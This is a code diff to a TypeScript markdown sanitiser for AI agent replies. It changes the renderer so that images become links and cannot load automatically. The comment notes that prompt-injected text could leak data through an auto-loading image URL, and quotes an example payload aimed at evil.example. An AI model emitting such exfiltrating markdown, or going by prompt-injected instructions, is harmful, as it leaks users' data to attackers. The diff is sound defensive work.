@@ -3,8 +3,10 @@ import { Marked } from "marked";
 /**
  * Markdown → HTML for untrusted text (AI agent replies, which can echo post
  * bodies, error strings or prompt-injected content). marked does not sanitise,
- * so: raw HTML is shown as text, and links/images only keep http(s), mailto or
+ * so: raw HTML is shown as text, and links only keep http(s), mailto or
  * relative URLs — javascript:, data: and friends render as plain text.
+ * Images become links: an <img> loads the moment the reply shows, so injected
+ * text could leak data in its URL (![](https://evil.example/?d=…)) unclicked.
  */
 
 const SAFE_SCHEMES = new Set(["http", "https", "mailto"]);
@@ -51,10 +53,10 @@ const safeMarked = new Marked({
       const t = title ? ` title="${escapeAttrText(title)}"` : "";
       return `<a href="${escapeHtml(href)}"${t}>${inner}</a>`;
     },
-    image({ href, title, text }) {
-      if (!isSafeHref(href)) return escapeAttrText(text);
-      const t = title ? ` title="${escapeAttrText(title)}"` : "";
-      return `<img src="${escapeHtml(href)}" alt="${escapeAttrText(text)}"${t}>`;
+    image({ href, text }) {
+      const label = escapeAttrText(text || "Image");
+      if (!isSafeHref(href)) return label;
+      return `<a href="${escapeHtml(href)}" rel="noopener noreferrer nofollow">${label}</a>`;
     },
   },
 });
